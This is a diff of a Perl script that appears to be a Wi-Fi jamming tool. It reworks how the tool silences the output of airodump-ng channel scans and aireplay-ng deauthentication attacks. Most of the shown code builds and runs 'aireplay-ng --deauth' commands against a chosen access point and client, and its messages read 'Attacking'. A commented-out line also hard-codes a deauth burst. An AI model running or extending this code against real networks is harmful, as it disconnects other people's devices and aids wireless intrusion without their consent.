@@ -303,17 +303,23 @@ sub airodump {
 			"Threads", 0 );
 		threads->exit();
 	};
+	
+		my $silent=" > /dev/null 2>&1";
+	if ( $verbose == 1 ) {
+		$silent="";
+	}
 	if ( $xterm == 1 ) {
+		$silent=" > /dev/null 2>&1";
 		system(
 "xterm -fn fixed -geom -0-0 -title 'Scanning specified channel' -e 'airodump-ng -c "
 			  . $channel
 			  . " -w airodumpoutput "
 			  . $dev
-			  . " --output-format netxml -a' 2>/dev/null" );
+			  . " --output-format netxml -a' ".$silent );
 	}
 	else {
 		system(
-"airodump-ng -a -c $channel -w airodumpoutput $dev -d $target --output-format netxml 2>/dev/null"
+"airodump-ng -a -c $channel -w airodumpoutput $dev -d $target --output-format netxml ".$silent
 		);
 
 	}
@@ -330,7 +336,11 @@ sub jamming {
 			"Threads", 0 );
 		threads->exit();
 	};
+	my $silent=" > /dev/null";
 	if ( $verbose == 1 ) {
+		$silent="";
+	}
+		
 		if ( $direct == 1 ) {
 			&message(
 				$KILL . " with " . $deauth . " on " . $dev . " direct mode",
@@ -339,34 +349,19 @@ sub jamming {
 				  . $deauth . " -a " 
 				  . $target . " -c "
 				  . $KILL . " "
-				  . $dev );
-		}
-		else {
+				  . $dev .$silent  );
+		}	else {
 			&message( $KILL . " with " . $deauth . " on " . $dev,
 				"Attacking", 0 );
 			system( "aireplay-ng --deauth " 
 				  . $deauth . " -a " 
 				  . $KILL . " "
-				  . $dev );
-		}
-	}
-	else {
-
-		if ( $direct == 1 ) {
-			&message(
-				$KILL . " with " . $deauth . " on " . $dev . " direct mode",
-				"Attacking", 0 );
-			`aireplay-ng --deauth $deauth -a $target -c $KILL $dev`;
-		}
-		else {
-			&message( $KILL . " with " . $deauth . " on " . $dev,
-				"Attacking", 0 );
-			`aireplay-ng --deauth $deauth -a $KILL $dev`;
+				  . $dev .$silent );
 		}
 		&message( "Finished on " . $KILL . " with " . $deauth . " on " . $dev,
 			"Attacking", 0 );
 
-	}
+
 
 #system("xterm -fn fixed -geom -0-0 -title 'Jamming ".$KILL."' -e 'aireplay-ng --deauth 30 -a ".$target." -c ".$KILL." ".$dev."'");
 #threads->exit();
